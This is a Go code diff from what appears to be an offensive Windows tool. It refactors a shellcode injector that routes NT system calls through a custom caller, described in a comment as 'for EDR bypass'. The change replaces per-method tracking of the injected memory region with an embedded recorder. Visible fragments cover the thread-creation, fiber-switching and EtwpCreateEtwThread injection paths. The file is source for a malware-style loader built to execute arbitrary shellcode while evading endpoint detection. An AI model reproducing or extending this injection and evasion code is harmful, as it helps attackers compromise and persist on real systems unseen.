@@ -46,20 +46,12 @@ func (wc *WindowsConfig) caller() *wsyscall.Caller {
 }
 
 // windowsSyscallInjector wraps the standard injector but routes NT calls
-// through a syscall.Caller for EDR bypass.
+// through a syscall.Caller for EDR bypass. The embedded regionRecorder
+// exposes InjectedRegion() for SelfInjector.
 type windowsSyscallInjector struct {
-	config     *WindowsConfig
-	caller     *wsyscall.Caller
-	lastRegion Region
-	hasRegion  bool
-}
-
-// InjectedRegion returns the base address and size of the region allocated
-// by the most recent successful self-process Inject (MethodCreateThread,
-// MethodCreateFiber, MethodEtwpCreateEtwThread). Cross-process methods
-// allocate remotely and return (Region{}, false).
-func (w *windowsSyscallInjector) InjectedRegion() (Region, bool) {
-	return w.lastRegion, w.hasRegion
+	config *WindowsConfig
+	caller *wsyscall.Caller
+	regionRecorder
 }
 
 func (w *windowsSyscallInjector) Inject(shellcode []byte) error {
@@ -218,8 +210,7 @@ func (w *windowsSyscallInjector) injectCT(shellcode []byte) error {
 	)
 	windows.CloseHandle(windows.Handle(hThread))
 
-	w.lastRegion = Region{Addr: baseAddr, Size: uintptr(len(encoded))}
-	w.hasRegion = true
+	w.record(baseAddr, uintptr(len(encoded)))
 	return nil
 }
 
@@ -485,8 +476,7 @@ func (w *windowsSyscallInjector) injectFiber(shellcode []byte) error {
 
 	api.ProcSwitchToFiber.Call(shellcodeFiber)
 
-	w.lastRegion = Region{Addr: addr, Size: uintptr(len(shellcode))}
-	w.hasRegion = true
+	w.record(addr, uintptr(len(shellcode)))
 	return nil
 }
 
@@ -511,8 +501,7 @@ func (w *windowsSyscallInjector) injectEtwpCreateEtwThread(shellcode []byte) err
 		return fmt.Errorf("thread creation failed")
 	}
 
-	w.lastRegion = Region{Addr: addr, Size: uintptr(len(shellcode))}
-	w.hasRegion = true
+	w.record(addr, uintptr(len(shellcode)))
 	return nil
 }
 
